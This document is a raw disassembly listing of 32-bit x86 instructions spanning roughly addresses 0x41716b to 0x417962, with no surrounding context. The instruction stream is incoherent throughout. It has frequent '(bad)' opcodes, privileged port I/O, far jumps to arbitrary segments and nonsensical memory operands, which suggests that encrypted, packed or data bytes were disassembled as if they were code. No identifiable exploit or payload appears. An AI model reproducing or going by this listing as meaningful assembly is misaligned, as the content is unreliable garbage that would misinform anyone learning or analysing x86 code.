  41716b:	arpl   WORD PTR ds:0x4e2e3b1,si
  417171:	xchg   edx,eax
  417172:	int    0x16
  417174:	or     ebp,DWORD PTR [edi+0x193b38d9]
  41717a:	mov    al,ds:0xc75929ed
  41717f:	and    eax,0x23be41f9
  417184:	cwde   
  417185:	xchg   ecx,eax
  417186:	push   esi
  417187:	pushf  
  417188:	xchg   ecx,eax
  417189:	scas   eax,DWORD PTR es:[edi]
  41718a:	mov    al,ds:0x75d7e7a0
  41718f:	inc    esi
  417190:	or     eax,0x4abd6fe1
  417195:	div    DWORD PTR ds:0x8a8d2286
  41719b:	mov    ebx,0xa1a1c3b
  4171a0:	in     al,dx
  4171a1:	push   ecx
  4171a2:	retf   
  4171a3:	mov    eax,0x45790d1e
  4171a8:	scas   eax,DWORD PTR es:[edi]
  4171a9:	xchg   ebp,eax
  4171aa:	mov    dl,0xf8
  4171ac:	gs inc eax
  4171ae:	jae    0x4171ff
  4171b0:	cmp    BYTE PTR [ebx-0x23a8c30b],0x6b
  4171b7:	js     0x41715e
  4171b9:	ret    0x74a5
  4171bc:	sbb    eax,0x479ae18e
  4171c1:	js     0x417215
  4171c3:	in     al,dx
  4171c4:	sti    
  4171c5:	sbb    al,0xec
  4171c7:	sbb    eax,0x2eb6f834
  4171cc:	sbb    eax,DWORD PTR [eax+0x38af54b6]
  4171d2:	cli    
  4171d3:	addr16 test eax,0x443efa8f
  4171d9:	test   BYTE PTR [ebp-0x30],bh
  4171dc:	int3   
  4171dd:	mov    esi,0xf8ebd6d
  4171e2:	pushw  ss
  4171e4:	push   ds
  4171e5:	inc    edx
  4171e6:	fcom   DWORD PTR [edi]
  4171e8:	movups xmm0,xmm0
  4171eb:	(bad)  
  4171ec:	push   eax
  4171ed:	cmp    BYTE PTR [ecx+0x6c],0x68
  4171f1:	xlat   BYTE PTR ds:[ebx]
  4171f2:	jbe    0x4171f4
  4171f4:	adc    esp,DWORD PTR [edi]
  4171f6:	or     DWORD PTR [ecx+0x754878c4],edx
  4171fc:	adc    DWORD PTR [ebp+0x15],0xffffff84
  417200:	and    eax,0x3be61168
  417205:	in     al,dx
  417206:	jmp    0x4171cb
  417208:	ret    0xc524
  41720b:	ret    0xd696
  41720e:	(bad)  
  41720f:	fidivr DWORD PTR [eax+0x3e]
  417212:	mov    edx,0x705d7ae9
  417217:	fdiv   DWORD PTR [eax+0x38d75fad]
  41721d:	or     bl,bl
  41721f:	jne    0x4171b5
  417221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417222:	mov    edx,0x691c1f92
  417227:	jmp    0x417250
  417229:	fs push edx
  41722b:	into   
  41722c:	lea    eax,[edx-0x370191ce]
  417232:	mov    dh,0xdf
  417234:	push   0xd7424c12
  417239:	sub    eax,0xd7660c50
  41723e:	mov    ?,WORD PTR [ecx]
  417240:	scas   eax,DWORD PTR es:[edi]
  417241:	mov    WORD PTR ds:0x62d98747,fs
  417247:	call   0x85ef65b2
  41724c:	in     eax,dx
  41724d:	js     0x41723f
  41724f:	or     dl,BYTE PTR [ecx-0x3a]
  417252:	cmc    
  417253:	frstor [eax-0x522af3eb]
  417259:	in     al,0xb1
  41725b:	iret   
  41725c:	test   edx,0x4f09bb5e
  417262:	xor    DWORD PTR [eax+esi*2+0x7d07a6f],0xfffffff1
  41726a:	out    0x8f,eax
  41726c:	adc    eax,0x50ff36e0
  417271:	mov    edx,0xeca0104b
  417276:	mov    eax,ds:0xe46f865f
  41727b:	jge    0x4172a9
  41727d:	or     al,0xa2
  41727f:	scas   al,BYTE PTR es:[edi]
  417280:	popa   
  417281:	cmp    eax,0x5bc3ce3a
  417286:	push   cs
  417287:	mov    ebx,0xb93919df
  41728c:	arpl   WORD PTR [eax],di
  41728e:	test   al,0xf2
  417290:	sbb    BYTE PTR [ebp-0x112bb883],0xa8
  417297:	hlt    
  417298:	pop    eax
  417299:	cmp    eax,0x843e485c
  41729e:	sub    dh,BYTE PTR [ebp-0x55a80f4e]
  4172a4:	add    eax,esp
  4172a6:	mov    ecx,0xddcfcffb
  4172ab:	cmc    
  4172ac:	mov    dh,0x1b
  4172ae:	xchg   BYTE PTR [ebp+0x3e683564],bl
  4172b4:	ret    0x81ab
  4172b7:	add    BYTE PTR [eax-0x54f7bc13],cl
  4172bd:	loop   0x417277
  4172bf:	dec    ebx
  4172c0:	inc    ebp
  4172c1:	sbb    DWORD PTR [edi-0x5b],0x3214777d
  4172c8:	mov    eax,ds
  4172ca:	add    al,0x81
  4172cc:	fbstp  TBYTE PTR cs:[ebp-0x573bfe41]
  4172d3:	or     cl,cl
  4172d5:	xchg   DWORD PTR es:[edi-0x41],edx
  4172d9:	jns    0x417292
  4172db:	push   edx
  4172dc:	cmp    DWORD PTR [esi],eax
  4172de:	adc    ch,al
  4172e0:	pextrw ecx,(bad),0xc5
  4172e2:	dec    esi
  4172e3:	xor    eax,0x96c6efbb
  4172e8:	outs   dx,DWORD PTR ds:[esi]
  4172e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172ea:	mov    dl,0xba
  4172ec:	(bad)  
  4172ed:	int3   
  4172ee:	xor    edi,edi
  4172f0:	jo     0x417316
  4172f2:	cwde   
  4172f3:	jae    0x417331
  4172f5:	pop    eax
  4172f6:	call   FWORD PTR [ebx-0x6adefc04]
  4172fc:	pop    edi
  4172fd:	mov    edi,0x1841466b
  417302:	mov    ebx,0xbfd3a0dd
  417307:	retf   
  417308:	add    DWORD PTR [eax],ebp
  41730a:	cdq    
  41730b:	sbb    BYTE PTR [esi],bh
  41730d:	mov    ebp,0x2cc9d1ac
  417312:	dec    ebp
  417313:	or     ebp,DWORD PTR [esi+0x16]
  417316:	fld    QWORD PTR [ecx-0x501afe87]
  41731c:	mov    edx,0x1fdcaa9c
  417321:	test   BYTE PTR [esi-0x34],al
  417324:	inc    edx
  417325:	test   eax,0x26ff87db
  41732a:	push   ds
  41732b:	out    dx,eax
  41732c:	jnp    0x41739a
  41732e:	mov    ah,al
  417330:	xchg   esp,eax
  417331:	dec    eax
  417332:	ret    
  417333:	enter  0x5a6e,0xf8
  417337:	stos   BYTE PTR es:[edi],al
  417338:	(bad)  
  417339:	and    al,0x7e
  41733b:	ret    
  41733c:	sti    
  41733d:	lods   al,BYTE PTR ds:[esi]
  41733e:	loop   0x417399
  417340:	scas   al,BYTE PTR es:[edi]
  417341:	das    
  417342:	pop    esi
  417343:	out    0x29,eax
  417345:	add    eax,0x87a9dd86
  41734a:	loope  0x417365
  41734c:	jecxz  0x41734f
  41734e:	rol    BYTE PTR [ebx],cl
  417350:	test   al,0xc0
  417352:	xor    ecx,DWORD PTR [eax-0x7d]
  417355:	daa    
  417356:	shl    eax,cl
  417358:	jp     0x4173c5
  41735a:	and    DWORD PTR [ebp+edx*2+0x4af23520],edx
  417361:	je     0x4173b5
  417363:	fdivr  st,st(2)
  417365:	push   ds
  417366:	inc    edx
  417367:	mov    BYTE PTR [ebp-0x2ee35f6b],bh
  41736d:	and    BYTE PTR [edx],0xd1
  417370:	or     DWORD PTR [eax],eax
  417372:	mov    dl,0x19
  417374:	or     DWORD PTR [edi+0x11f3f1ef],esp
  41737a:	pushf  
  41737b:	cmp    DWORD PTR [ebx+0x4a],esp
  41737e:	test   DWORD PTR [ebp-0x44],eax
  417381:	xor    al,0xe1
  417383:	je     0x417346
  417385:	mov    al,ds:0xe90e0aed
  41738a:	sub    al,0x58
  41738c:	fwait
  41738d:	lods   eax,DWORD PTR ds:[esi]
  41738e:	cmp    ebx,DWORD PTR [esi+0x399e1469]
  417394:	cmp    dl,dl
  417396:	les    esi,FWORD PTR [ecx]
  417398:	arpl   WORD PTR [edi+0x5a415efd],di
  41739e:	and    ebx,DWORD PTR [ebx]
  4173a0:	ds mov ah,0x42
  4173a3:	mov    al,0x97
  4173a5:	fisubr DWORD PTR [ebp+0x78]
  4173a8:	sbb    edx,DWORD PTR [ecx]
  4173aa:	or     cl,BYTE PTR [eax-0x6f023fa2]
  4173b0:	pop    ecx
  4173b1:	jmp    0x3ba3:0xada23f6f
  4173b8:	dec    ecx
  4173b9:	int3   
  4173ba:	xlat   BYTE PTR ds:[ebx]
  4173bb:	push   ebx
  4173bc:	scas   al,BYTE PTR es:[edi]
  4173bd:	cmp    al,0xa6
  4173bf:	stc    
  4173c0:	jecxz  0x4173c6
  4173c2:	add    ebp,0xffffff85
  4173c5:	fst    st(1)
  4173c7:	and    BYTE PTR [esi-0x5710efb0],0x9a
  4173ce:	fwait
  4173cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173d0:	outs   dx,BYTE PTR ds:[esi]
  4173d1:	in     al,0x15
  4173d3:	mov    ebx,0x74de6baf
  4173d8:	cld    
  4173d9:	in     al,dx
  4173da:	cmp    eax,0x8f24127
  4173df:	rcr    BYTE PTR [ecx],cl
  4173e1:	jmp    0x41741d
  4173e3:	lds    ebp,FWORD PTR [eax+eiz*8-0x2c1f97ab]
  4173ea:	mov    ch,0xe
  4173ec:	mov    al,ds:0x97ede55d
  4173f1:	jno    0x417464
  4173f3:	ja     0x417414
  4173f5:	mov    WORD PTR [ecx+ecx*4],?
  4173f8:	jnp    0x4173b1
  4173fa:	jns    0x417383
  4173fc:	mov    cl,0xcd
  4173fe:	add    eax,0x1c3a8415
  417403:	(bad)  
  417405:	cmp    eax,0x95b993db
  41740a:	icebp  
  41740b:	mov    dh,0x71
  41740d:	and    DWORD PTR [esp],0x86759085
  417414:	rol    dh,1
  417416:	sub    eax,0xd3592e1f
  41741b:	lods   al,BYTE PTR ds:[esi]
  41741c:	mov    bl,0xa4
  41741e:	jg     0x4173f5
  417420:	mov    dl,BYTE PTR [esi+0x26]
  417423:	out    0x4,al
  417425:	or     DWORD PTR [ebp+0x64],esi
  417428:	fimul  DWORD PTR [esi-0x134530ab]
  41742e:	stc    
  41742f:	push   0xb9caf217
  417434:	in     al,0xf0
  417436:	test   BYTE PTR [esi+0x6f],ch
  417439:	fbstp  TBYTE PTR [edi-0x1130a430]
  41743f:	sti    
  417440:	jmp    0x5d69:0x578cd23b
  417447:	adc    BYTE PTR [ebx-0x2c],0xcd
  41744b:	xor    al,0xa
  41744d:	dec    esi
  41744e:	repnz nop
  417450:	retf   
  417451:	pusha  
  417452:	loop   0x417403
  417454:	ins    BYTE PTR es:[edi],dx
  417455:	push   0xbf653dd5
  41745a:	out    0xfc,eax
  41745c:	or     dh,BYTE PTR [ecx+0x7b]
  41745f:	jo     0x417480
  417461:	sub    eax,0x6a6edc6a
  417466:	push   es
  417467:	jge    0x417417
  417469:	addr16 std 
  41746b:	or     ebx,eax
  41746d:	mov    ecx,0x4285e97a
  417472:	add    edx,DWORD PTR [edx]
  417474:	js     0x4173f7
  417476:	repnz sbb BYTE PTR [ecx-0x29],ah
  41747a:	dec    eax
  41747b:	xchg   DWORD PTR [ecx+0x2a],ebp
  41747e:	(bad)  
  41747f:	jl     0x4174fe
  417481:	adc    bh,BYTE PTR [ebp-0x37e43b3a]
  417487:	aaa    
  417488:	out    0xb0,eax
  41748a:	sbb    ecx,DWORD PTR [eax-0x78]
  41748d:	add    BYTE PTR [eax],al
  41748f:	add    BYTE PTR [eax],al
  417491:	add    bh,bl
  417493:	dec    ebp
  417494:	call   0x305f:0xdfdf9a89
  41749b:	adc    al,0x61
  41749d:	retf   0xbc7b
  4174a0:	sahf   
  4174a1:	xlat   BYTE PTR ds:[ebx]
  4174a2:	sub    esi,edx
  4174a4:	add    BYTE PTR [eax],al
  4174a6:	repz add al,0x0
  4174a9:	add    cl,cl
  4174ab:	adc    al,0x8c
  4174ad:	cmp    al,0x62
  4174af:	sbb    ah,cl
  4174b1:	and    dh,BYTE PTR ds:0x7c9fe2ca
  4174b7:	or     al,0xe5
  4174b9:	xor    eax,0xf85005a0
  4174be:	out    dx,eax
  4174bf:	ja     0x417473
  4174c1:	ret    
  4174c2:	cs adc eax,0xa0fd109d
  4174c8:	jp     0x4174fd
  4174ca:	jg     0x417535
  4174cc:	sub    esp,DWORD PTR [edi]
  4174ce:	in     eax,dx
  4174cf:	pop    ebp
  4174d0:	js     0x4174e1
  4174d2:	cmp    edx,DWORD PTR [ebx]
  4174d4:	add    DWORD PTR [bx+si-0x14],eax
  4174d8:	js     0x417496
  4174da:	cmp    DWORD PTR [ecx+0x5],esp
  4174dd:	addr16 sub al,0xeb
  4174e0:	imul   eax,DWORD PTR [ecx],0xa43f184c
  4174e6:	mov    ebp,DWORD PTR [edi+0x50]
  4174e9:	(bad)
  4174ed:	sub    bl,bl
  4174ef:	xlat   BYTE PTR ds:[ebx]
  4174f0:	rcr    DWORD PTR [eax+eax*8-0x11],0xc
  4174f5:	call   0xbacc:0x51b55913
  4174fc:	xor    eax,0xef567d4
  417501:	push   esp
  417502:	div    bh
  417504:	jmp    0x6da356b3
  417509:	mov    dh,BYTE PTR [ebp+0x5f2b0989]
  41750f:	jge    0x4174be
  417511:	mov    WORD PTR ds:0x2650b6f4,gs
  417517:	add    al,0x4d
  417519:	fcomip st,st(7)
  41751b:	mov    ds:0x5d951582,eax
  417520:	push   esi
  417521:	jl     0x417599
  417523:	xor    BYTE PTR [ebx-0x3744e9ad],dl
  417529:	test   BYTE PTR [esi],ch
  41752b:	(bad)  
  41752c:	retf   
  41752d:	jbe    0x4174eb
  41752f:	call   0xdad25fd5
  417534:	arpl   WORD PTR [ecx+0x78fb338a],bp
  41753a:	sti    
  41753b:	inc    edi
  41753c:	out    dx,eax
  41753d:	pop    es
  41753e:	xchg   edi,eax
  41753f:	mov    WORD PTR [ecx-0x57dbe420],gs
  417545:	add    eax,esi
  417547:	gs cmp al,0x79
  41754a:	jo     0x4174e7
  41754c:	dec    ecx
  41754d:	jmp    0xb642ada4
  417552:	ja     0x417587
  417554:	mov    al,ds:0xd30bb8b4
  417559:	inc    edi
  41755a:	sub    eax,0xf01b7093
  41755f:	xchg   ebx,eax
  417560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417561:	cmp    ebp,esp
  417563:	ror    DWORD PTR [edx-0x46],1
  417566:	mov    ds:0x912f0d35,al
  41756b:	pop    ebx
  41756c:	lods   al,BYTE PTR ds:[esi]
  41756d:	clc    
  41756e:	mov    BYTE PTR [ebx+0x13b9b85e],dh
  417574:	dec    ebx
  417575:	dec    edi
  417576:	and    dh,ch
  417578:	dec    edx
  417579:	imul   eax,DWORD PTR [edx-0x10],0xb0d60900
  417580:	out    dx,al
  417581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417582:	scas   eax,DWORD PTR es:[edi]
  417583:	push   esi
  417584:	mov    bl,0x2d
  417586:	shl    DWORD PTR [eax],1
  417588:	ret    
  417589:	in     al,dx
  41758a:	pusha  
  41758b:	ja     0x41757e
  41758d:	sub    ebp,DWORD PTR [eax+0x78b6132b]
  417593:	out    0xf,eax
  417595:	int3   
  417596:	in     eax,dx
  417597:	inc    eax
  417599:	jnp    0x417587
  41759b:	dec    ebx
  41759c:	sub    DWORD PTR [edx],edx
  41759e:	or     eax,0xcef69369
  4175a3:	int    0x45
  4175a5:	cs je  0x41754d
  4175a8:	out    0x57,al
  4175aa:	arpl   si,bp
  4175ac:	ficomp DWORD PTR [ebp-0x24]
  4175af:	cmp    BYTE PTR [edi+edi*1-0x32],dl
  4175b3:	push   es
  4175b4:	into   
  4175b5:	or     eax,0x529ed149
  4175ba:	into   
  4175bb:	pop    esi
  4175bc:	push   esi
  4175bd:	cs shl ecx,cl
  4175c0:	push   0xffffffd5
  4175c2:	xchg   edi,eax
  4175c3:	ins    DWORD PTR es:[edi],dx
  4175c4:	pop    edi
  4175c5:	leave  
  4175c6:	cmp    al,0x9d
  4175c8:	loope  0x4175d7
  4175ca:	pusha  
  4175cb:	stos   BYTE PTR es:[edi],al
  4175cc:	dec    edx
  4175cd:	jnp    0x4175ff
  4175cf:	stc    
  4175d0:	lods   al,BYTE PTR ds:[esi]
  4175d1:	jmp    0x417622
  4175d3:	inc    dx
  4175d5:	add    eax,0x35533b51
  4175da:	and    dh,bh
  4175dc:	dec    esi
  4175dd:	stos   DWORD PTR es:[edi],eax
  4175de:	test   bh,bh
  4175e0:	jno    0x4175cc
  4175e2:	cs test edx,eax
  4175e5:	(bad)  [edx+0x1180f0]
  4175eb:	popa   
  4175ec:	inc    ebp
  4175ed:	(bad)  
  4175ee:	jno    0x41762c
  4175f0:	gs mov ch,0x56
  4175f3:	jbe    0x4175a3
  4175f5:	push   ds
  4175f6:	nop
  4175f7:	lods   al,BYTE PTR ds:[esi]
  4175f8:	stos   BYTE PTR es:[edi],al
  4175f9:	lock ss test eax,0x2b8b2ca9
  417600:	addr16 es retf 0xe00f
  417605:	cmc    
  417606:	dec    esi
  417607:	scas   eax,DWORD PTR es:[edi]
  417608:	fbld   TBYTE PTR [ecx-0x50]
  41760b:	retf   
  41760c:	cld    
  41760d:	jle    0x4175be
  41760f:	adc    al,0x60
  417611:	xor    eax,0xd32b27d
  417616:	lahf   
  417617:	addr16 jge 0x41763e
  41761a:	fild   QWORD PTR ds:0xf72c47bf
  417620:	outs   dx,BYTE PTR ds:[esi]
  417621:	sub    DWORD PTR ds:0xddde21c4,ebp
  417627:	daa    
  417628:	add    BYTE PTR [eax],ah
  41762a:	loopne 0x417637
  41762c:	cmp    eax,0x30cc26f
  417631:	sub    ah,BYTE PTR [ebp-0x75]
  417634:	jbe    0x41762b
  417636:	call   0x993e:0x1bc08fa0
  41763d:	inc    edx
  41763e:	test   al,cl
  417640:	(bad)  
  417641:	or     eax,0x15fc3d52
  417646:	cmp    DWORD PTR gs:[edx],edx
  417649:	inc    esi
  41764a:	repnz imul edx,DWORD PTR [eax*8+0x72caef12],0x2f
  417653:	test   BYTE PTR [eax+0x55],cl
  417656:	pushf  
  417657:	es jg  0x41762b
  41765a:	or     esi,DWORD PTR [ecx-0x6dba8ef7]
  417660:	mov    ds:0x469dbdf7,al
  417665:	and    BYTE PTR [ebx],cl
  417667:	push   esp
  417668:	lea    eax,[esp+edx*4+0x39]
  41766c:	jg     0x4176e8
  41766e:	jno    0x41760e
  417670:	fnstenv [ebp*1+0x19f846a6]
  417677:	loopne 0x4176b5
  417679:	outs   dx,DWORD PTR ds:[esi]
  41767a:	in     al,0x80
  41767c:	jmp    0x232c:0x87f0563a
  417683:	(bad)  
  417684:	stc    
  417685:	iret   
  417686:	sahf   
  417687:	pop    eax
  417688:	jne    0x417626
  41768a:	cmp    DWORD PTR [esi-0x66],0xc3c916c3
  417691:	push   eax
  417692:	or     BYTE PTR [edi-0x1d678640],ch
  417698:	sti    
  417699:	mov    ecx,0xc292c100
  41769e:	(bad)  
  41769f:	(bad)  
  4176a0:	outs   dx,DWORD PTR ds:[esi]
  4176a1:	jecxz  0x41762e
  4176a3:	test   al,0x2
  4176a5:	out    0x3,eax
  4176a7:	dec    esi
  4176a8:	mov    dl,0x6a
  4176aa:	daa    
  4176ab:	dec    ebp
  4176ac:	daa    
  4176ad:	push   esi
  4176ae:	jbe    0x417680
  4176b0:	sti    
  4176b1:	mov    al,0xed
  4176b3:	int    0x39
  4176b5:	push   eax
  4176b6:	(bad)
  4176b9:	(bad)  
  4176ba:	mov    ebp,DWORD PTR [bx]
  4176bd:	add    cl,dh
  4176bf:	mov    esp,0x8ba89840
  4176c4:	sbb    al,0x55
  4176c6:	inc    ebp
  4176c7:	push   ebx
  4176c8:	ror    BYTE PTR [ebp-0x54141fb3],1
  4176ce:	aad    0x38
  4176d0:	jmp    0x4176cc
  4176d2:	mov    al,0x36
  4176d4:	js     0x417696
  4176d6:	xor    ebp,DWORD PTR [esi]
  4176d8:	pop    ecx
  4176d9:	cld    
  4176da:	stc    
  4176db:	and    esp,DWORD PTR [ecx]
  4176dd:	add    esp,DWORD PTR [edx]
  4176df:	in     al,dx
  4176e0:	add    esp,DWORD PTR [ebx+edi*4]
  4176e3:	jnp    0x41775a
  4176e5:	mov    edx,esp
  4176e7:	push   ds
  4176e8:	sbb    al,0xc4
  4176ea:	loope  0x417757
  4176ec:	or     edx,esi
  4176ee:	sub    eax,0xaf7070b8
  4176f3:	xchg   ebx,eax
  4176f4:	jb     0x417732
  4176f6:	outs   dx,BYTE PTR ds:[esi]
  4176f7:	or     DWORD PTR [ecx+0x5524dca0],eax
  4176fd:	push   edx
  4176fe:	mov    dl,0x49
  417700:	arpl   WORD PTR [esi],ax
  417702:	ja     0x41774b
  417704:	mov    DWORD PTR [ebx],esp
  417706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417707:	mov    ds:0x90cd95b2,eax
  41770c:	jge    0x41769e
  41770e:	fcmovnbe st,st(1)
  417710:	repz or dh,BYTE PTR [edx-0x27]
  417714:	jns    0x417774
  417716:	sub    DWORD PTR [esi],esi
  417718:	pop    edx
  417719:	in     al,dx
  41771a:	push   ebx
  41771b:	pop    es
  41771c:	dec    eax
  41771d:	sub    DWORD PTR [ebx+0x6d],ebp
  417720:	fisttp WORD PTR [edx-0x3d]
  417723:	add    dl,dh
  417725:	add    al,0x2e
  417727:	add    dl,BYTE PTR [edx+ecx*8]
  41772a:	sbb    DWORD PTR [ecx],0x70
  41772d:	lfs    eax,FWORD PTR [eax+0x4b]
  417731:	(bad)  
  417732:	shl    BYTE PTR [esi],cl
  417734:	push   edx
  417735:	fild   DWORD PTR [esi]
  417737:	add    esi,DWORD PTR [ecx]
  417739:	daa    
  41773a:	mov    eax,ds:0x8846a419
  41773f:	hlt    
  417740:	pop    edx
  417741:	sbb    ch,bl
  417743:	jmp    0x4176d8
  417745:	jo     0x41772a
  417747:	in     eax,0xfd
  417749:	loop   0x4177a8
  41774b:	cmp    ch,BYTE PTR [edi]
  41774d:	xchg   esp,eax
  41774e:	inc    esi
  41774f:	mov    ds,WORD PTR [ecx+0xa577f39]
  417755:	cmp    edx,ecx
  417757:	and    eax,0x58d9143c
  41775c:	fisttp QWORD PTR [ecx+eax*2]
  41775f:	pop    ss
  417760:	dec    ebp
  417761:	dec    esi
  417762:	daa    
  417763:	jg     0x417729
  417765:	ret    
  417766:	or     edx,0x1c
  417769:	das    
  41776a:	xchg   BYTE PTR [eax],ah
  41776c:	rcr    BYTE PTR ds:0xc8d8d888,1
  417772:	jge    0x417784
  417774:	xchg   esp,eax
  417775:	sahf   
  417776:	sar    DWORD PTR [esi],cl
  417778:	aaa    
  417779:	adc    ecx,ebx
  41777b:	loope  0x417794
  41777d:	jecxz  0x4177e3
  41777f:	in     al,0x25
  417781:	test   BYTE PTR [esi],cl
  417783:	dec    eax
  417784:	int    0xdb
  417786:	jmp    0x3231ba0f
  41778b:	adc    DWORD PTR [edx-0x1eb8a0b],ebp
  417791:	scas   eax,DWORD PTR es:[edi]
  417792:	shl    DWORD PTR [edx+eiz*2],0x4a
  417796:	sub    DWORD PTR [edx+0x6f],0x79
  41779a:	sbb    ch,BYTE PTR [esp+edx*2-0x5cc94edb]
  4177a1:	test   BYTE PTR [edx],ah
  4177a3:	ss inc ecx
  4177a5:	push   ds
  4177a6:	adc    edx,ebx
  4177a8:	or     eax,0x1a9e98f8
  4177ad:	inc    ebx
  4177ae:	dec    edx
  4177af:	jg     0x4177c4
  4177b1:	jmp    0x41776c
  4177b3:	jg     0x417800
  4177b5:	xor    bh,BYTE PTR [ebx]
  4177b7:	dec    edx
  4177b8:	xor    edx,esi
  4177ba:	push   ds
  4177bb:	inc    edx
  4177bc:	jle    0x417794
  4177be:	mov    ss,WORD PTR [edi+0x35]
  4177c1:	lods   eax,DWORD PTR ds:[esi]
  4177c2:	sub    cl,bh
  4177c4:	adc    eax,0xf1d88851
  4177c9:	inc    esi
  4177ca:	repz sbb BYTE PTR [ebx-0x2b],0x1c
  4177cf:	test   al,0x48
  4177d1:	cmp    dl,BYTE PTR [eax+0x43]
  4177d4:	inc    ecx
  4177d5:	sub    esp,esp
  4177d7:	ror    BYTE PTR [edx-0x8ac87a9],cl
  4177dd:	ins    BYTE PTR es:[edi],dx
  4177de:	sub    DWORD PTR [ebx+0x78],0x5c8d617a
  4177e5:	aam    0xaa
  4177e7:	adc    eax,0x65594c57
  4177ec:	into   
  4177ed:	sbb    DWORD PTR [ebp+ebp*1+0x5bfe64f8],0xf13ab4a
  4177f8:	psraw  mm7,mm3
  4177fb:	dec    ecx
  4177fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177fd:	jl     0x417866
  4177ff:	jmp    0xc434:0x39c7e621
  417806:	sbb    al,0x77
  417808:	je     0x4177b4
  41780a:	pop    esi
  41780b:	jle    0x41784c
  41780d:	sbb    eax,0x76220567
  417812:	imul   ebp,DWORD PTR [esi-0x6a],0x48
  417816:	fidiv  DWORD PTR [ebx-0x4e]
  417819:	leave  
  41781a:	dec    esp
  41781b:	outs   dx,BYTE PTR ds:[esi]
  41781c:	int3   
  41781d:	dec    ecx
  41781e:	in     al,0xab
  417820:	mov    bh,0x58
  417822:	inc    eax
  417823:	loop   0x417875
  417825:	call   0x14578fdb
  41782a:	mov    bh,0xb6
  41782c:	pop    es
  41782d:	sub    eax,0x432bcbd3
  417832:	xor    ecx,DWORD PTR [edi+0x56]
  417835:	jecxz  0x417839
  417837:	mov    edx,ebp
  417839:	jl     0x417895
  41783b:	in     eax,dx
  41783c:	imul   esp,edi,0x9755e849
  417842:	shl    DWORD PTR [edx],cl
  417844:	sbb    DWORD PTR [esi-0x130a381],ebp
  41784a:	add    eax,0xa1891a3b
  41784f:	jns    0x41788b
  417851:	std    
  417852:	inc    edx
  417853:	push   ebp
  417854:	popa   
  417855:	xchg   ebx,eax
  417856:	adc    BYTE PTR [ecx-0x22],dl
  417859:	paddsb mm2,QWORD PTR [ebx]
  41785c:	aaa    
  41785d:	and    bl,BYTE PTR [edi]
  41785f:	add    edx,DWORD PTR [ebx-0x2b]
  417862:	aad    0x50
  417864:	jge    0x41787c
  417866:	leave  
  417867:	sbb    al,0x0
  417869:	pop    ds
  41786a:	stos   DWORD PTR es:[edi],eax
  41786b:	je     0x4178e4
  41786d:	xlat   BYTE PTR ds:[ebx]
  41786e:	and    DWORD PTR [eax],edi
  417870:	sbb    BYTE PTR [ebx],0xb2
  417873:	cmp    BYTE PTR [edx-0x72],al
  417876:	xchg   ebx,eax
  417877:	mov    es,WORD PTR [edx+0x682e5425]
  41787d:	outs   dx,DWORD PTR ds:[esi]
  41787e:	or     cl,BYTE PTR [esi-0x43]
  417881:	or     eax,0x8179abae
  417886:	sbb    ah,BYTE PTR [ecx-0x1f]
  417889:	mov    bl,dl
  41788b:	jmp    0x41783d
  41788d:	xor    eax,0x2a64d406
  417892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417893:	sbb    al,0x6e
  417895:	pop    esi
  417896:	in     eax,dx
  417897:	sbb    bh,bl
  417899:	inc    ecx
  41789a:	fcomp  DWORD PTR [esi]
  41789d:	and    ch,ch
  41789f:	or     DWORD PTR ss:[edi-0x6c4d47e8],esi
  4178a6:	hlt    
  4178a7:	xor    bl,bl
  4178a9:	mov    DWORD PTR [edx+edx*8-0x1b53a6a7],edi
  4178b0:	add    BYTE PTR [ebp-0x1c9d8ae6],cl
  4178b6:	test   BYTE PTR [ebp-0x51],bl
  4178b9:	mov    ah,0x81
  4178bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178bc:	sbb    eax,0xd05438b3
  4178c1:	push   cs
  4178c2:	jae    0x417885
  4178c4:	ins    BYTE PTR es:[edi],dx
  4178c5:	mov    dl,bl
  4178c7:	xchg   BYTE PTR [esi+0x42],dh
  4178ca:	repz jecxz 0x41784d
  4178cd:	fs call 0x7041:0xca714d7
  4178d5:	imul   ebx,DWORD PTR [ebp-0x5f],0x79
  4178d9:	addr16 retf 
  4178db:	lods   al,BYTE PTR ds:[esi]
  4178dc:	lds    ebp,FWORD PTR [esi]
  4178de:	cmp    DWORD PTR [esi+0x42732a12],ebx
  4178e4:	mov    bh,0x26
  4178e6:	mov    ebx,0xb59265bc
  4178eb:	mov    al,0x91
  4178ed:	js     0x417942
  4178ef:	jns    0x417881
  4178f1:	add    al,BYTE PTR [edx-0x43]
  4178f4:	dec    eax
  4178f5:	(bad)  
  4178f6:	or     DWORD PTR [eax-0xf7216e2],edx
  4178fc:	push   esp
  4178fd:	call   0x433f:0x454af0ae
  417904:	and    bl,bh
  417906:	lods   al,BYTE PTR ds:[esi]
  417907:	mov    esp,0xa20d1f5
  41790c:	dec    ebx
  41790d:	and    edx,eax
  41790f:	sbb    edi,DWORD PTR [ebx-0x31]
  417912:	jl     0x4178d1
  417914:	data16 cld 
  417916:	and    edi,DWORD PTR [ecx-0x5b]
  417919:	fcom   DWORD PTR [ecx+0x5c]
  41791c:	adc    dh,BYTE PTR [edi]
  41791e:	rcl    BYTE PTR [ecx-0x10d883fe],0x3a
  417925:	(bad)  [eax+0x39fcd24b]
  41792b:	mov    bh,BYTE PTR [edi]
  41792d:	adc    eax,0x6b740351
  417932:	js     0x41798d
  417934:	jns    0x41794c
  417936:	and    esp,DWORD PTR [edx+edi*1-0x6570dc26]
  41793d:	cmc    
  41793e:	push   edi
  41793f:	xlat   BYTE PTR ds:[ebx]
  417940:	ins    BYTE PTR es:[edi],dx
  417941:	push   es
  417942:	ins    BYTE PTR es:[edi],dx
  417943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417944:	shr    DWORD PTR [edi+0x72eedfb3],cl
  41794a:	fst    st(7)
  41794c:	clc    
  41794d:	dec    ebp
  41794e:	or     al,0x63
  417950:	xor    dl,dh
  417952:	(bad)
  417956:	or     al,0xca
  417958:	pop    ebx
  417959:	(bad)  ss:[ebx+ebp*8+0x4e]
  41795e:	mov    bl,0x1b
  417960:	sbb    ebp,edx
  417962:	fadd   DWORD PTR [eax+0x3a]
